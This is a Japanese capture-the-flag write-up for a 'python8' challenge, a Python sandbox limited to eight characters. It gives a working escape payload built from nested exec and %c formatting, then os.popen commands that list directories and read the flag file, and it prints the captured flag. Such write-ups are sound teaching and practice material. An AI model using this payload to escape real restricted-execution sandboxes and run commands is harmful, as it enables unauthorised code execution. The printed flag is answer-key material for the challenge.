# python8:Misc

$ python8

`nc 160.251.183.149 3838`

Attachment\
[python8.zip]()

Difficulty Level : medium\
Point : 300

# Solution
添付ファイルを見てみると、使える文字が`0'()%cex`だけに制限されていた。\
Python8は未来すぎて使える文字が8文字しかないらしい。\
使える文字からして、明らかに`exec`と`%c`を使えとのことだろう。\
`exec((((('exec(%%%%%%%%%%%%%%%%c%%%%%%%%c%%%%c%%c%c())'%(0xe00%0xcc))%(0xeccce0%0xcecc))%(0xeec%0xce))%(0xeeee%0xc0))%(0xc0cecce%0xe0cc))`が使えるという情報を頂いたのでそのまま使わせていただきました。(この部分はどうしても分からなかった...)\
python8.pyを実行して上記コードを投げると、任意の関数を実行できるようになる。(上記コードの解析依頼をChatGPT君に投げたら、バグりかけて途中で停止し正常動作に戻ったのはすごかった。さすがです。)\
`ls`、`cd`、`cat`を使ってflagを探したいが、これはLinuxではなくPythonなので、コマンドをそれぞれ置き換える。
```python
ls = import os as o; print('\n'.join(o.listdir('.')))
cd = import os as o; o.chdir('..')
cat = import os as o; print(o.popen('cat flag.txt').read())
```
上記コードを使ってディレクトリのどこかにあるflagを探索していく。
```
$ nc 160.251.183.149 3838
Python 8.26.1997 (main, Aug 26 2997, 00:00:00) [SatoCompiler 1.0.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exec((((('exec(%%%%%%%%%%%%%%%%c%%%%%%%%c%%%%c%%c%c())'%(0xe00%0xcc))%(0xeccce0%0xcecc))%(0xeec%0xce))%(0xeeee%0xc0))%(0xc0cecce%0xe0cc))
import os as o; print('\n'.join(o.listdir('.')))
run
>>> exec((((('exec(%%%%%%%%%%%%%%%%c%%%%%%%%c%%%%c%%c%c())'%(0xe00%0xcc))%(0xeccce0%0xcecc))%(0xeec%0xce))%(0xeeee%0xc0))%(0xc0cecce%0xe0cc))
import os as o; o.chdir('..')
>>> exec((((('exec(%%%%%%%%%%%%%%%%c%%%%%%%%c%%%%c%%c%c())'%(0xe00%0xcc))%(0xeccce0%0xcecc))%(0xeec%0xce))%(0xeeee%0xc0))%(0xc0cecce%0xe0cc))
import os as o; print('\n'.join(o.listdir('.')))
app
var
home
sys
srv
usr
opt
mnt
bin
etc
media
dev
flag-31ac9361857cf0098f093447acbbd315.txt
proc
sbin
lib
lib64
root
boot
run
tmp
>>> exec((((('exec(%%%%%%%%%%%%%%%%c%%%%%%%%c%%%%c%%c%c())'%(0xe00%0xcc))%(0xeccce0%0xcecc))%(0xeec%0xce))%(0xeeee%0xc0))%(0xc0cecce%0xe0cc))
import os as o; print(o.popen('cat flag-31ac9361857cf0098f093447acbbd315.txt').read())
flag{1_pr0b4bly_w0n7_b3_4l1v3_by_7h3_71m3_py7h0n_r34ch35_v3r510n_8}
```
flagが得られた。

`flag{1_pr0b4bly_w0n7_b3_4l1v3_by_7h3_71m3_py7h0n_r34ch35_v3r510n_8}`
